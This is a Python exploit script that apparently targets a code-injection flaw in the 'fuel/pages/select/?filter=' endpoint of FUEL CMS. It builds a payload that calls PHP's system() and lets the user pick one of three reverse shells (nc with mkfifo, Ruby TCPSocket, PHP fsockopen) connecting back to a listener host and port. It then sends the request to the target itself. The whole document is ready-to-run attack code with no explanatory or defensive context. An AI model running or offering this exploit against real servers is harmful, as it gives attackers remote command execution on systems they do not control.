#!/usr/bin/python3

import os
import requests
import sys
from urllib.parse import quote_plus, quote

shells = """{nc, php, ruby}"""
if(len(sys.argv) != 5):
    print(f"Usage: ./{sys.argv[0]} URL Lhost Lport shell{shells}")
    exit(0)

URL = sys.argv[1] + "fuel/pages/select/?filter="
Lhost = sys.argv[2]
Lport = sys.argv[3]
shell = sys.argv[4]

p1 = """'+pi(print($a='system'))+$a('"""
p2 = """')+'"""
nc = f"""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {Lhost} {Lport} >/tmp/f"""
ruby = f"""ruby -rsocket -e'f=TCPSocket.open("{Lhost}",{Lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
php = f"""php -r '$sock=fsockopen("{Lhost}",{Lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""

p1 = quote_plus(p1)
p2 = quote_plus(p2)
nc = quote_plus(nc)
php = quote_plus(php)
ruby = quote_plus(ruby)

if (shell == "nc"):
    payload = p1 + nc + p2

if (shell == "php"):
    payload = p1 + php + p2
    
if (shell == "ruby"):
    payload = p1 + ruby + p2

print(f"""Get request on this url to get a shell :) \n{URL+payload} \n or wait a few seconds""")
request = requests.get(URL+payload)
print(request)
